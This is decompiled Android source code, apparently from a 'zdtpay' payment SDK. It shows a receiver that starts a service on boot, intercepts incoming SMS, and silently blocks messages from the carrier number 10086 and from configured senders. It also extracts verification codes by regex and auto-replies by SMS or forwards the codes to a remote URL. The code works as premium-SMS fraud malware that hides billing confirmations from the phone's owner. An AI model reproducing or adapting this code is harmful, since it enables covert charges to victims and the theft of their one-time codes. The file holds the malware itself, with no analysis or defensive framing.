package com.zdtpay;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import com.duowan.mobile.netroid.RequestQueue;
import com.zdtpay.tools.MyLogPrinter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONException;
import org.json.JSONObject;

public class Rfb
  extends BroadcastReceiver
{
  SharedPreferences a;
  String b = "SENT_SMS_ACTION_rec";
  String c = "DELIVERED_SMS_ACTION_rec";
  private BroadcastReceiver d = new h(this);
  private BroadcastReceiver e = new i(this);
  
  public Rfb() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
      paramContext.startService(new Intent(paramContext, MySde.class));
    }
    while (!paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
      return;
    }
    Object[] arrayOfObject = (Object[])paramIntent.getExtras().get("pdus");
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
    this.a = paramContext.getSharedPreferences("mysp", 0);
    if (arrayOfObject.length > 0) {
      arrayOfSmsMessage[0] = SmsMessage.createFromPdu((byte[])arrayOfObject[0]);
    }
    for (paramIntent = "sms:" + arrayOfSmsMessage[0].getMessageBody();; paramIntent = "sms:")
    {
      ZTbbe.a(paramContext, "00000", "3.01_rec", paramIntent);
      if (com.zdtpay.tools.b.e == null) {}
      Object localObject1;
      ArrayList localArrayList;
      String str1;
      StringBuffer localStringBuffer;
      int k;
      for (;;)
      {
        try
        {
          localObject1 = this.a.getString("requestData", "");
          if (!((String)localObject1).equals("")) {
            com.zdtpay.tools.b.e = com.zdtpay.a.c.a(new JSONObject((String)localObject1));
          }
          if (com.zdtpay.tools.b.e == null) {
            break;
          }
          localArrayList = com.zdtpay.tools.b.e.d();
          if (localArrayList == null) {
            break;
          }
          ZTbbe.a(paramContext, "00000", "3.02_rec", paramIntent);
          int j = 0;
          if (j >= arrayOfSmsMessage.length) {
            break;
          }
          arrayOfSmsMessage[j] = SmsMessage.createFromPdu((byte[])arrayOfObject[j]);
          str1 = arrayOfSmsMessage[j].getMessageBody();
          localStringBuffer = new StringBuffer(arrayOfSmsMessage[j].getOriginatingAddress());
          if (localStringBuffer.toString().startsWith("+86"))
          {
            localStringBuffer.delete(0, 3);
            if (localStringBuffer.toString().contains("10086")) {
              abortBroadcast();
            }
            k = 0;
            if (k < localArrayList.size()) {
              break label346;
            }
            j += 1;
            continue;
          }
          if (!localStringBuffer.toString().startsWith("86")) {
            continue;
          }
        }
        catch (JSONException paramContext)
        {
          paramContext.printStackTrace();
          return;
        }
        localStringBuffer.delete(0, 2);
      }
      label346:
      com.zdtpay.a.b localB = (com.zdtpay.a.b)localArrayList.get(k);
      String str2 = localB.a();
      paramIntent = ((com.zdtpay.a.b)localArrayList.get(k)).l();
      int i = 0;
      for (;;)
      {
        if (i >= paramIntent.size()) {
          i = 0;
        }
        for (;;)
        {
          if (!paramIntent.contains(localStringBuffer.toString())) {
            break label507;
          }
          abortBroadcast();
          break;
          localObject1 = new StringBuffer((String)paramIntent.get(i));
          if (str1.contains(((StringBuffer)localObject1).toString()))
          {
            abortBroadcast();
            i = 1;
          }
          else
          {
            if (!((StringBuffer)localObject1).toString().contains("*")) {
              break label500;
            }
            ((StringBuffer)localObject1).deleteCharAt(((StringBuffer)localObject1).length() - 1);
            if (!localStringBuffer.toString().startsWith(((StringBuffer)localObject1).toString())) {
              break label500;
            }
            abortBroadcast();
            i = 1;
          }
        }
        label500:
        i += 1;
      }
      label507:
      if (localB.f().size() > 0)
      {
        paramIntent = localB.f().iterator();
        label527:
        if (paramIntent.hasNext()) {
          break label660;
        }
      }
      for (;;)
      {
        if (i != 0)
        {
          abortBroadcast();
          ZTbbe.a(paramContext, str2, "3_rec", "sms:" + str1 + " " + "|isSend:" + this.a.getBoolean(new StringBuilder(String.valueOf(localB.i())).append("_ec").toString(), false));
          if (!this.a.getBoolean(localB.i() + "_ec", false)) {
            break label689;
          }
        }
        k += 1;
        break;
        label660:
        localObject1 = (String)paramIntent.next();
        if (!localStringBuffer.toString().contains((CharSequence)localObject1)) {
          break label527;
        }
        i = 1;
      }
      label689:
      paramIntent = localB.g();
      if (paramIntent != null)
      {
        localObject1 = paramIntent;
        if (!paramIntent.equals("")) {}
      }
      else
      {
        localObject1 = localStringBuffer.toString();
      }
      Object localObject2 = localB.h();
      Object localObject3 = localB.d().split("<\\|>");
      Matcher localMatcher = Pattern.compile(localObject3[0]).matcher(str1);
      paramIntent = (Intent)localObject2;
      if (localObject3.length > 0)
      {
        MyLogPrinter.b("yzm   正则   --------" + localObject3[0]);
        paramIntent = (Intent)localObject2;
        label787:
        if (localMatcher.find()) {}
      }
      else
      {
        if ((localB.c() == null) || (localB.c().equals(""))) {
          break label1233;
        }
        paramIntent = localB.c() + paramIntent;
      }
      label1233:
      for (;;)
      {
        if ((localB.b() == null) || ("".equals(localB.b())))
        {
          paramContext.getApplicationContext().registerReceiver(this.d, new IntentFilter(this.b));
          localObject2 = new Intent(this.b);
          ((Intent)localObject2).putExtra(com.zdtpay.tools.c.o, str2);
          localObject2 = PendingIntent.getBroadcast(paramContext, str2.hashCode(), (Intent)localObject2, 134217728);
          paramContext.getApplicationContext().registerReceiver(this.e, new IntentFilter(this.c));
          localObject3 = new Intent(this.c);
          ((Intent)localObject3).putExtra(com.zdtpay.tools.c.o, str2);
          localObject3 = PendingIntent.getBroadcast(paramContext, str2.hashCode(), (Intent)localObject3, 134217728);
          SmsManager.getDefault().sendTextMessage((String)localObject1, null, paramIntent, (PendingIntent)localObject2, (PendingIntent)localObject3);
          ZTbbe.a(paramContext, str2, "4.1sms_rec", "sms:" + paramIntent);
        }
        for (;;)
        {
          this.a.edit().putBoolean(localB.i() + "_ec", true).commit();
          break;
          if (!"".equals(localMatcher.group()))
          {
            paramIntent = localMatcher.group();
            localObject2 = Pattern.compile(localObject3[1]).matcher(paramIntent);
            for (;;)
            {
              if (!((Matcher)localObject2).find())
              {
                MyLogPrinter.b("yzm   messsage   --------" + paramIntent);
                break;
              }
              paramIntent = ((Matcher)localObject2).group();
            }
          }
          paramIntent = localB.h();
          break label787;
          paramIntent = localB.b() + paramIntent;
          ZTbbe.a(paramContext, str2, "4.2url_rec", "url:" + paramIntent);
          f.a().a(new com.duowan.mobile.netroid.b.a(0, paramIntent, new j(this, paramContext, str2, paramIntent)));
        }
      }
    }
  }
}
